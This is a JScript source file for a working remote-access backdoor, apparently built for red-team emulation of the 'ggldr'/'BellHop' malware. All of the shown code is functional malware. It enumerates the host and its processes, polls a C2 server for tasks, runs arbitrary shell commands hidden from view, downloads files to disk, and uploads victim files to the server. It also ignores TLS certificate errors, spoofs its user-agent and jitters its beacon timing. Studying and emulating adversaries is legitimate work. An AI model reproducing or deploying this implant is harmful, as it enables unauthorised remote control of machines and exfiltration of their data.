// This script provides attackers remote access to infected systems via the HTTP/S protocol
// This script is based on "ggldr" / "BellHop" / TransBaseOdbcDriver.js (SHA-256: 313e38756b80755078855fe0f1ffea2ea0d47dfffcbe2d687aaa8bdb37c892f4)

function GetComputerInform() {
    var network = new ActiveXObject('WScript.Network');
    var output = "";
    output += "\nComputer name: " + network.computerName;
    output += "\nDomain: " + network.userDomain;
    output += "\nUsername: " + network.userName;
    

    var cpuArch = GetObject("winmgmts:root\\cimv2:Win32_Processor='cpu0'").AddressWidth;
    output += "\nOS-bit: " + cpuArch;

    var objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
    var colItems = objWMIService.ExecQuery("select * from Win32_OperatingSystem");
    var enumItems = new Enumerator(colItems);
    for (; !enumItems.atEnd(); enumItems.moveNext()) {
        var objItem = enumItems.item();
        output += "\nOS Name: " + objItem.Name;
        output += "\nVersion: " + objItem.Version;
        output += "\nService Pack: " + objItem.ServicePackMajorVersion + "." + objItem.ServicePackMinorVersion;
        output += "\nOS Manufacturer: " + objItem.Manufacturer;
        output += "\nWindows Directory: " + objItem.WindowsDirectory;
        output += "\nLocale: " + objItem.Locale;
        output += "\nAvailable Physical Memory: " + objItem.FreePhysicalMemory;
        output += "\nTotal Virtual Memory: " + objItem.TotalVirtualMemorySize;
        output += "\nAvailable Virtual Memory: " + objItem.FreeVirtualMemory;
    }
    return output;
}

function GetCompProcess(){
    var output = "";
    var objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
    var colItems = objWMIService.ExecQuery("select * from Win32_Process");
    var enumItems = new Enumerator(colItems);
    for (; !enumItems.atEnd(); enumItems.moveNext()){
        var objItem = enumItems.item();
        output += "\n" + objItem.Name;
    }
    return output;
}

// createGUID creates a GUID used to uniquely identify the C2 session to the c2 server
function createGUID(){
    guid = Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10);
    return guid;
}

// getTasking gets tasks from the red team C2 server
function getTasking(url, guid){
    var httpReq = new ActiveXObject("MSxml2.ServerXMLHTTP.6.0")
    httpReq.setOption(2, 13056); // ignore TLS cert errors
    httpReq.open("POST", url, false)
    var proxy = getProxy();
    if (proxy != ""){
        httpReq.setProxy(2, proxy, "");
    }
    httpReq.setRequestHeader("User-agent", "Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramind Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
    httpReq.send(guid);
    command = httpReq.responseText;
    return command;

}

// sendTaskOutput sends task output to the red team C2 server
function sendTaskOutput(url, cmdOutput, guid){
    var httpReq = new ActiveXObject("MSxml2.ServerXMLHTTP.6.0")
    httpReq.setOption(2, 13056); // ignore TLS cert errors
    httpReq.open("POST", url, false)
    var proxy = getProxy();
    if (proxy != ""){
        httpReq.setProxy(2, proxy, "");
    }
    httpReq.setRequestHeader("User-agent", "Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramind Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
    httpReq.send(cmdOutput);
    command = httpReq.responseText;
    return command;
}

// downloadFile downloads a specified file from the C2 server and writes it to disk
function downloadFile(url, fileDestination) {
    url = LHOST + url;
    var Object = new ActiveXObject('MSxml2.ServerXMLHTTP.6.0');
    Object.setOption(2, 13056); // ignore TLS cert errors
    Object.open("GET", url, false);
    var proxy = getProxy();
    if (proxy != ""){
        Object.setProxy(2, proxy, "");
    }
    Object.setRequestHeader("User-agent", "Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramind Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
    Object.send();

    // create Data Stream
    var Stream = WScript.CreateObject('ADODB.Stream');

    // prepare the stream for writing data
    Stream.Open();
    Stream.Type = 1; // adTypeBinary
    Stream.Write(Object.responseBody);
    Stream.Position = 0;
    
    // create an empty target file; overwrite if file exists
    var File = WScript.CreateObject('Scripting.FileSystemObject');
    if (File.FileExists(fileDestination))
    {
        File.DeleteFile(fileDestination);
    }

    // write downloaded file to disk
    Stream.SaveToFile(fileDestination, 2); // adSaveCreateOverWrite
    Stream.Close();
}

// uploadFile
function uploadFile(url, inFile) {
    // read file
    var fileObject = new ActiveXObject("Scripting.FileSystemObject");
    fileOutput = fileObject.OpenTextFile(inFile);
    fileData = fileOutput.ReadAll();
    fileOutput.Close();

    url = LHOST + url;
    var Object = new ActiveXObject('MSxml2.ServerXMLHTTP.6.0');
    Object.setOption(2, 13056); // ignore TLS cert errors
    Object.open("POST", url, false);
    var proxy = getProxy();
    if (proxy != ""){
        Object.setProxy(2, proxy, "");
    }
    Object.setRequestHeader("User-agent", "Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramind Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1");
    Object.send(fileData);
}

// getRandomFile generates an absolute path to a random file in the user temp directory; no files are created in this function
function getRandomFile(){
    var fileObject = new ActiveXObject("Scripting.FileSystemObject");
    randomFile = fileObject.GetSpecialFolder(2) + "\\" + fileObject.GetTempName();
    return randomFile;
}
// execShellCommand executes taskings specified by red team on the C2 server; command output is redirected to a random file
function execShellCommand(command, randomFile){
    if (command.length == 0){
        return
    }

    var shell = new ActiveXObject("WScript.Shell");
    s = command.split(" ")
    if (s[0] == "download") {
        downloadFile(s[1], s[2]);
        cmdWithRedirect = "%comspec% /C echo '[+] Upload Complete' > " + randomFile + " 2>&1";
        shell.Run(cmdWithRedirect, 0, true);
        return;
    } else if (s[0] == "upload"){
        uploadFile(s[1], s[2]);
        return;
    } else if (s[0] == "enum-system") {
        sysinfo = GetComputerInform();
        sysinfo += GetCompProcess();
        var FSO = new ActiveXObject("Scripting.FileSystemObject");
        fileHandle = FSO.OpenTextFile(randomFile, 2, true);
        fileHandle.WriteLine(sysinfo);
        fileHandle.Close();
        return;

    } else {
        // call download function passing url and file destination
        cmdWithRedirect = "%comspec% /C " + command + " > " + randomFile + " 2>&1";
        //WScript.Echo(cmdWithRedirect)
        shell.Run(cmdWithRedirect, 0, true);
        return;
    }
}

// getCommandOutput reads the random file containing command line output
function getCommandOutput(randomFile){
    var fileObject = new ActiveXObject("Scripting.FileSystemObject");
    fileOutput = fileObject.OpenTextFile(randomFile);
    cmdOutput = fileOutput.ReadAll();
    fileOutput.Close();
    fileObject.DeleteFile(randomFile);
    return cmdOutput;
}

// getProxy queries the Windows registry to obtain Proxy server information
function getProxy(){
    var WshShell = new ActiveXObject("WScript.Shell");
    var ProxyEnable = WshShell.RegRead("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyEnable");
    if (ProxyEnable == 1){
        var ProxyServer = WshShell.RegRead("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyServer");
        return ProxyServer;
    } else {
        return "";
    }
}

// sleep causes the program to pause for a period specificed by sleepInterval
function sleep(){
    min = 1;
    max = 3;
    jitter = Math.round(Math.random()*(max-min)+min);
    sleepInterval = 500*3*jitter;
    //WScript.Echo(sleepInterval);
    WScript.Sleep(sleepInterval);
}

// main
function main() {
    // get the C2 server IP address via command line argument
    try {
        LHOST = WScript.Arguments.Item(0)
    } catch (e) {
        LHOST = "https://192.168.0.4/"
    }
    
    // setup URLs and session GUID
    registerURL = LHOST + "register.html"
    taskURL = LHOST + "task.html";
    outputURL = LHOST + "output.html";
    guid = createGUID();
   
    // main command loop; check for tasking, execute tasking, send output to C2 server
    while (true) {
        sleep();
        try {
            //WScript.Echo("Getting tasking from C2 server")
            command = getTasking(taskURL, guid);
        } catch (e) {
            // WScript.Echo(e.description)
            continue;
        }
        if (command.length == 0) {
            continue;
        }
        randomFile = getRandomFile();
    
        try {
            // WScript.Echo("Executing command")
            execShellCommand(command, randomFile);
            cmdOutput = getCommandOutput(randomFile);
        }catch (e) {
            continue;
        }
        try {
            // WScript.Echo("Sending command output to the C2 server")
            sendTaskOutput(outputURL, cmdOutput, guid);
            cmdOutput = ""
        }catch (e) {
            // WScript.Echo(e.description)
            continue;
        }
    }
}

main();